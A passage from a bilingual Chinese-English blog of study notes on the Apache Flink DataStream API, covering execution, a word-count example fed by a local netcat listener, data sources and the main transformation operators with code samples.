<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">DataStream&lt;String&gt; text = env.readTextFile(<span class="string">&quot;file:///path/to/file&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>This will give you a DataStream on which you can then apply transformations to create new derived DataStreams.</p>
<p>You apply transformations by calling methods on DataStream with a transformation functions. For example, a map transformation looks like this:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;String&gt; input = ...;</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; parsed = input.map(<span class="keyword">new</span> MapFunction&lt;String, Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>This will create a new DataStream by converting every String in the original collection to an Integer.</p>
<p>Once you have a DataStream containing your final results, you can write it to an outside system by creating a sink. These are just some example methods for creating a sink:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">writeAsText(String path)</span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure>

<p>Once you specified the complete program you need to <strong>trigger the program execution</strong> by calling <code>execute()</code> on the <code>StreamExecutionEnvironment</code>. Depending on the type of the <code>ExecutionEnvironment</code> the execution will be triggered on your local machine or submit your program for execution on a cluster.</p>
<p>The <code>execute()</code> method will wait for the job to finish and then return a <code>JobExecutionResult</code>, this contains execution times and accumulator results.</p>
<p>If you don’t want to wait for the job to finish, you can trigger asynchronous job execution by calling <code>executeAysnc()</code> on the <code>StreamExecutionEnvironment</code>. It will return a <code>JobClient</code> with which you can communicate with the job you just submitted. For instance, here is how to implement the semantics of <code>execute()</code> by using <code>executeAsync()</code>.</p>
<p>如果你不想等待作业完成，你可以通过调用StreamExecutionEnvironment的executeAysnc()来触发异步作业的执行。它将返回一个JobClient，你可以用它与你刚刚提交的作业进行通信。例如，这里是如何通过使用executeAsync()来实现execute()的语义。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> JobClient jobClient = env.executeAsync();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> JobExecutionResult jobExecutionResult = jobClient.getJobExecutionResult().get();</span><br></pre></td></tr></table></figure>

<p>That last part about program execution is crucial to understanding when and how Flink operations are executed. All Flink programs are executed lazily: When the program’s main method is executed, the data loading and transformations do not happen directly. Rather, each operation is created and added to a dataflow graph. The operations are actually executed when the execution is explicitly triggered by an <code>execute()</code> call on the execution environment. Whether the program is executed locally or on a cluster depends on the type of execution environment.</p>
<p>最后关于程序执行的部分对于理解Flink操作何时以及如何执行至关重要。所有的Flink程序都是懒散地执行的。当程序的主方法被执行时，数据加载和转换不会直接发生。相反，每个操作都被创建并添加到数据流图中。当执行环境上的execute()调用明确地触发执行时，这些操作才真正被执行。程序是在本地还是在集群上执行，取决于执行环境的类型。</p>
<p>The lazy evaluation lets you construct sophisticated programs that Flink executes as one holistically planned unit.</p>
<h4 id="改进后的完整程序如下"><a href="#改进后的完整程序如下" class="headerlink" title="改进后的完整程序如下"></a>改进后的完整程序如下</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    DataStreamSource&lt;String&gt; input = env.readTextFile(<span class="string">&quot;data/String2Int&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;Integer&gt; parsed = input.map(<span class="keyword">new</span> MapFunction&lt;String, Integer&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(s)*<span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    parsed.print();</span><br><span class="line">    env.execute(<span class="string">&quot;Double num&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// input</span></span><br><span class="line"><span class="comment">// 111</span></span><br><span class="line"><span class="comment">// 222</span></span><br><span class="line"><span class="comment">// 333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// 12&gt; 222</span></span><br><span class="line"><span class="comment">// 3&gt; 666</span></span><br><span class="line"><span class="comment">// 15&gt; 444</span></span><br></pre></td></tr></table></figure>

<h3 id="案例二：统计单词个数的案例"><a href="#案例二：统计单词个数的案例" class="headerlink" title="案例二：统计单词个数的案例"></a>案例二：统计单词个数的案例</h3><p>这个案例很经典，几乎所有大数据的都会使用。</p>
<p>The following program is a complete, working example of streaming window word count application, that counts the words coming from a web socket in 5 second windows. You can copy &amp; paste the code to run it locally.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple2&lt;String, Integer&gt;&gt; sum = env</span><br><span class="line">      .socketTextStream(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">      .flatMap(<span class="keyword">new</span> Splitter())</span><br><span class="line">      .keyBy(value -&gt; value.f0)</span><br><span class="line">      .window(TumblingProcessingTimeWindows.of(Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sum.print();</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Splitter</span> <span class="keyword">implements</span> <span class="title">FlatMapFunction</span>&lt;<span class="title">String</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>,<span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String s, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; collector)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">for</span>(String word:s.split(<span class="string">&quot; &quot;</span>)) &#123;</span><br><span class="line">        collector.collect(<span class="keyword">new</span> Tuple2&lt;String,Integer&gt;(word,<span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*7&gt; (lalalal,1)</span></span><br><span class="line"><span class="comment">12&gt; (xiaoyuyu,2)</span></span><br><span class="line"><span class="comment">15&gt; (hadoop,3)</span></span><br><span class="line"><span class="comment">7&gt; (lalalal,2)</span></span><br><span class="line"><span class="comment">14&gt; (lalalla,1)</span></span><br><span class="line"><span class="comment">1&gt; (spark,1)</span></span><br><span class="line"><span class="comment">13&gt; (flink,2)</span></span><br><span class="line"><span class="comment">1&gt; (spark,1)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>To run the example program, start the input stream with netcat first from a terminal:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lk 9999</span><br></pre></td></tr></table></figure>

<p>可以从结果看出，准确的统计出五秒内的单词数量，且只统计五秒内的单词数量，之前时间窗口的单词不会统计。</p>
<p>这里的TumblingProcessingTimeWindows先不深究具体是什么，当作一个时间窗口即可，目前猜测是一种滚动广口，然后sum(1)中的参数1代表的就是sum第二个字段，keyBy(中的f0)就代表按照第一个字段聚合。</p>
<h2 id="Data-Sources"><a href="#Data-Sources" class="headerlink" title="Data Sources"></a>Data Sources</h2><p>1）基于文件</p>
<ul>
<li><code>readTextFile(path)</code> - Reads text files, i.e. files that respect the <code>TextInputFormat</code> specification, line-by-line and returns them as Strings.    逐行读取文本文件，即遵守TextInputFormat规范的文件，并将其作为字符串返回。</li>
<li><code>readFile(fileInputFormat, path)</code> - Reads (once) files as dictated by the specified file input format.    读取（一次）由指定的文件输入格式所决定的文件。</li>
<li><code>readFile(fileInputFormat, path, watchType, interval, pathFilter, typeInfo)</code> - This is the method called internally by the two previous ones. It reads files in the <code>path</code> based on the given <code>fileInputFormat</code>. Depending on the provided <code>watchType</code>, this source may periodically monitor (every <code>interval</code> ms) the path for new data (<code>FileProcessingMode.PROCESS_CONTINUOUSLY</code>), or process once the data currently in the path and exit (<code>FileProcessingMode.PROCESS_ONCE</code>). Using the <code>pathFilter</code>, the user can further exclude files from being processed.    暂时用不到，前两个够了。</li>
</ul>
<p>2）基于Socket</p>
<p>socketTextStream</p>
<p>从Socket中读取数据，元素可以通过一个分隔符分开，之前的例子已经使用过了。</p>
<p>3）基于集合</p>
<p>fromCollection(Collection)</p>
<p>通过Java的Collection集合创建一个数据流，集合中的所有元素必须是相同类型的</p>
<p>如果满足以下条件，Flink将数据类型识别为POJO类型（并允许“按名称”字段引用）：</p>
<ul>
<li>该类是共有且独立的（没有非静态内部类）</li>
<li>该类有共有的无参构造方法</li>
<li>类（及父类）中所有的不被static、transient修饰的属性要么有公有的（且不被fifinal修饰），要么是包含共有的getter和setter方法，这些方法遵循java bean命名规范。</li>
</ul>
<p>4）自定义输入</p>
<p>可以使用StreamExecutionEnvironment.addSource(sourceFunction)将一个流式数据源加到程序中。</p>
<p>Flink提供了许多预先实现的源函数，但是也可以编写自己的自定义源，方法是为非并行源implements SourceFunction，或者为并行源 implements ParallelSourceFunction接口，或者extends RichParallelSourceFunction。</p>
<p>Flink也提供了一批内置的Connector（连接器），如下表列了几个主要的</p>
<table>
<thead>
<tr>
<th>连接器</th>
<th>是否提供Source支持</th>
<th>是否提供Sink支持</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Kafka</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td>ElasticSearch</td>
<td>no</td>
<td>yes</td>
</tr>
<tr>
<td>HDFS</td>
<td>no</td>
<td>yes</td>
</tr>
<tr>
<td>Twitter Streaming PI</td>
<td>yes</td>
<td>no</td>
</tr>
</tbody></table>
<h2 id="DataStream-Transformations"><a href="#DataStream-Transformations" class="headerlink" title="DataStream Transformations"></a>DataStream Transformations</h2><p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/">https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/</a></p>
<h3 id="数据流转换"><a href="#数据流转换" class="headerlink" title="数据流转换 #"></a>数据流转换 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#%E6%95%B0%E6%8D%AE%E6%B5%81%E8%BD%AC%E6%8D%A2">#</a></h3><p>把官方文档所有的算子都列了一遍，注意一些细节就好。</p>
<h4 id="Map"><a href="#Map" class="headerlink" title="Map #"></a>Map <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#map">#</a></h4><h5 id="DataStream-→-DataStream"><a href="#DataStream-→-DataStream" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream">#</a></h5><p>Takes one element and produces one element. A map function that doubles the values of the input stream:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;Integer&gt; dataStream = <span class="comment">//...</span></span><br><span class="line">dataStream.map(<span class="keyword">new</span> MapFunction&lt;Integer, Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(Integer value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="FlatMap"><a href="#FlatMap" class="headerlink" title="FlatMap #"></a>FlatMap <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#flatmap">#</a></h4><h5 id="DataStream-→-DataStream-1"><a href="#DataStream-→-DataStream-1" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-1">#</a></h5><p>Takes one element and produces zero, one, or more elements. A flatmap function that splits sentences to words:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.flatMap(<span class="keyword">new</span> FlatMapFunction&lt;String, String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(String value, Collector&lt;String&gt; out)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(String word: value.split(<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">            out.collect(word);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>区别就在于返回的值不是一一对应的。</p>
<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter #"></a>Filter <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#filter">#</a></h4><h5 id="DataStream-→-DataStream-2"><a href="#DataStream-→-DataStream-2" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-2">#</a></h5><p>Evaluates a boolean function for each element and retains those for which the function returns true. A filter that filters out zero values:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.filter(<span class="keyword">new</span> FilterFunction&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Integer value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>保留判断条件返回true的值。</p>
<h4 id="KeyBy"><a href="#KeyBy" class="headerlink" title="KeyBy #"></a>KeyBy <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#keyby">#</a></h4><h5 id="DataStream-→-KeyedStream"><a href="#DataStream-→-KeyedStream" class="headerlink" title="DataStream → KeyedStream #"></a>DataStream → KeyedStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-keyedstream">#</a></h5><p>Logically partitions a stream into disjoint partitions. All records with the same key are assigned to the same partition. Internally, <em>keyBy()</em> is implemented with hash partitioning. There are different ways to <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/fault-tolerance/state/#keyed-datastream">specify keys</a>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.keyBy(value -&gt; value.getSomeKey());</span><br><span class="line">dataStream.keyBy(value -&gt; value.f0);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A type <strong>cannot be a key if</strong>:</p>
<ol>
<li>it is a POJO type but does not override the <code>hashCode()</code> method and relies on the <code>Object.hashCode()</code> implementation.</li>
<li>it is an array of any type.</li>
</ol>
</blockquote>
<p>需要注意哪些元素是可以keyBy的。</p>
<h4 id="Reduce"><a href="#Reduce" class="headerlink" title="Reduce #"></a>Reduce <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#reduce">#</a></h4><h5 id="KeyedStream-→-DataStream"><a href="#KeyedStream-→-DataStream" class="headerlink" title="KeyedStream → DataStream #"></a>KeyedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#keyedstream-rarr-datastream">#</a></h5><p>A “rolling” reduce on a keyed data stream. Combines the current element with the last reduced value and emits the new value.</p>
<p>A reduce function that creates a stream of partial sums:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">keyedStream.reduce(<span class="keyword">new</span> ReduceFunction&lt;Integer&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">reduce</span><span class="params">(Integer value1, Integer value2)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value1 + value2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="Window"><a href="#Window" class="headerlink" title="Window #"></a>Window <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#window">#</a></h4><h5 id="KeyedStream-→-WindowedStream"><a href="#KeyedStream-→-WindowedStream" class="headerlink" title="KeyedStream → WindowedStream #"></a>KeyedStream → WindowedStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#keyedstream-rarr-windowedstream">#</a></h5><p>Windows can be defined on already partitioned KeyedStreams. Windows group the data in each key according to some characteristic (e.g., the data that arrived within the last 5 seconds). See <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/windows.html">windows</a> for a complete description of windows.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream</span><br><span class="line">  .keyBy(value -&gt; value.f0)</span><br><span class="line">  .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">5</span>))); </span><br></pre></td></tr></table></figure>

<h4 id="WindowAll"><a href="#WindowAll" class="headerlink" title="WindowAll #"></a>WindowAll <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#windowall">#</a></h4><h5 id="DataStreamStream-→-AllWindowedStream"><a href="#DataStreamStream-→-AllWindowedStream" class="headerlink" title="DataStreamStream → AllWindowedStream #"></a>DataStreamStream → AllWindowedStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastreamstream-rarr-allwindowedstream">#</a></h5><p>Windows can be defined on regular DataStreams. Windows group all the stream events according to some characteristic (e.g., the data that arrived within the last 5 seconds). See <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/windows.html">windows</a> for a complete description of windows.</p>
<blockquote>
<p>This is in many cases a non-parallel transformation. All records will be gathered in one task for the windowAll operator.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream</span><br><span class="line">  .windowAll(TumblingEventTimeWindows.of(Time.seconds(<span class="number">5</span>)));</span><br></pre></td></tr></table></figure>

<p>在keyby后数据分流，window是把不同的key分开聚合成窗口，而windowall则把所有的key都聚合起来所以windowall的并行度只能为1，而window可以有多个并行度。</p>
<h4 id="Window-Apply"><a href="#Window-Apply" class="headerlink" title="Window Apply #"></a>Window Apply <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#window-apply">#</a></h4><h5 id="WindowedStream-→-DataStream"><a href="#WindowedStream-→-DataStream" class="headerlink" title="WindowedStream → DataStream #"></a>WindowedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#windowedstream-rarr-datastream">#</a></h5><h5 id="AllWindowedStream-→-DataStream"><a href="#AllWindowedStream-→-DataStream" class="headerlink" title="AllWindowedStream → DataStream #"></a>AllWindowedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#allwindowedstream-rarr-datastream">#</a></h5><p>Applies a general function to the window as a whole. Below is a function that manually sums the elements of a window.</p>
<blockquote>
<p>If you are using a windowAll transformation, you need to use an <code>AllWindowFunction</code> instead.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">windowedStream.apply(<span class="keyword">new</span> WindowFunction&lt;Tuple2&lt;String,Integer&gt;, Integer, Tuple, Window&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span> <span class="params">(Tuple tuple,</span></span></span><br><span class="line"><span class="params"><span class="function">            Window window,</span></span></span><br><span class="line"><span class="params"><span class="function">            Iterable&lt;Tuple2&lt;String, Integer&gt;&gt; values,</span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (value t: values) &#123;</span><br><span class="line">            sum += t.f1;</span><br><span class="line">        &#125;</span><br><span class="line">        out.collect (<span class="keyword">new</span> Integer(sum));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// applying an AllWindowFunction on non-keyed window stream</span></span><br><span class="line">allWindowedStream.apply (<span class="keyword">new</span> AllWindowFunction&lt;Tuple2&lt;String,Integer&gt;, Integer, Window&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span> <span class="params">(Window window,</span></span></span><br><span class="line"><span class="params"><span class="function">            Iterable&lt;Tuple2&lt;String, Integer&gt;&gt; values,</span></span></span><br><span class="line"><span class="params"><span class="function">            Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (value t: values) &#123;</span><br><span class="line">            sum += t.f1;</span><br><span class="line">        &#125;</span><br><span class="line">        out.collect (<span class="keyword">new</span> Integer(sum));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="WindowReduce"><a href="#WindowReduce" class="headerlink" title="WindowReduce #"></a>WindowReduce <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#windowreduce">#</a></h4><h5 id="WindowedStream-→-DataStream-1"><a href="#WindowedStream-→-DataStream-1" class="headerlink" title="WindowedStream → DataStream #"></a>WindowedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#windowedstream-rarr-datastream-1">#</a></h5><p>Applies a functional reduce function to the window and returns the reduced value.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">windowedStream.reduce (<span class="keyword">new</span> ReduceFunction&lt;Tuple2&lt;String,Integer&gt;&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">reduce</span><span class="params">(Tuple2&lt;String, Integer&gt; value1, Tuple2&lt;String, Integer&gt; value2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;String,Integer&gt;(value1.f0, value1.f1 + value2.f1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="Union"><a href="#Union" class="headerlink" title="Union #"></a>Union <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#union">#</a></h4><h5 id="DataStream-→-DataStream-3"><a href="#DataStream-→-DataStream-3" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-3">#</a></h5><p>Union of two or more data streams creating a new stream containing all the elements from all the streams. Note: If you union a data stream with itself you will get each element twice in the resulting stream.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.union(otherStream1, otherStream2, ...);</span><br></pre></td></tr></table></figure>

<p>本质上就是取并集且不去重，但是如果数据和自己本身作交集，每个元素就会出现两次。</p>
<h4 id="Window-Join"><a href="#Window-Join" class="headerlink" title="Window Join #"></a>Window Join <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#window-join">#</a></h4><h5 id="DataStream-DataStream-→-DataStream"><a href="#DataStream-DataStream-→-DataStream" class="headerlink" title="DataStream,DataStream → DataStream #"></a>DataStream,DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastreamdatastream-rarr-datastream">#</a></h5><p>Join two data streams on a given key and a common window.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.join(otherStream)</span><br><span class="line">    .where(&lt;key selector&gt;).equalTo(&lt;key selector&gt;)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">3</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction () &#123;...&#125;);</span><br></pre></td></tr></table></figure>

<p>取交集。</p>
<p>按照相同的Key合并两个数据集input1.join(input2).where(0).equalTo(1)。</p>
<p>同时也可以选择进行合并的时候的策略, 是分区还是广播, 是基于排序的算法还是基于哈希的算法input1.join(input2, JoinHint.BROADCAST_HASH_FIRST).where(0).equalTo(1)。</p>
<h4 id="Interval-Join"><a href="#Interval-Join" class="headerlink" title="Interval Join #"></a>Interval Join <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#interval-join">#</a></h4><h5 id="KeyedStream-KeyedStream-→-DataStream"><a href="#KeyedStream-KeyedStream-→-DataStream" class="headerlink" title="KeyedStream,KeyedStream → DataStream #"></a>KeyedStream,KeyedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#keyedstreamkeyedstream-rarr-datastream">#</a></h5><p>Join two elements e1 and e2 of two keyed streams with a common key over a given time interval, so that <code>e1.timestamp + lowerBound &lt;= e2.timestamp &lt;= e1.timestamp + upperBound</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// this will join the two streams so that</span></span><br><span class="line"><span class="comment">// key1 == key2 &amp;&amp; leftTs - 2 &lt; rightTs &lt; leftTs + 2</span></span><br><span class="line">keyedStream.intervalJoin(otherKeyedStream)</span><br><span class="line">    .between(Time.milliseconds(-<span class="number">2</span>), Time.milliseconds(<span class="number">2</span>)) <span class="comment">// lower and upper bound</span></span><br><span class="line">    .upperBoundExclusive(<span class="keyword">true</span>) <span class="comment">// optional</span></span><br><span class="line">    .lowerBoundExclusive(<span class="keyword">true</span>) <span class="comment">// optional</span></span><br><span class="line">    .process(<span class="keyword">new</span> IntervalJoinFunction() &#123;...&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="Window-CoGroup"><a href="#Window-CoGroup" class="headerlink" title="Window CoGroup #"></a>Window CoGroup <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#window-cogroup">#</a></h4><h5 id="DataStream-DataStream-→-DataStream-1"><a href="#DataStream-DataStream-→-DataStream-1" class="headerlink" title="DataStream,DataStream → DataStream #"></a>DataStream,DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastreamdatastream-rarr-datastream-1">#</a></h5><p>Cogroups two data streams on a given key and a common window.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.coGroup(otherStream)</span><br><span class="line">    .where(<span class="number">0</span>).equalTo(<span class="number">1</span>)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">3</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> CoGroupFunction () &#123;...&#125;);</span><br></pre></td></tr></table></figure>

<p>在一个给定的键和一个共同的窗口上对两个数据流进行分组。</p>
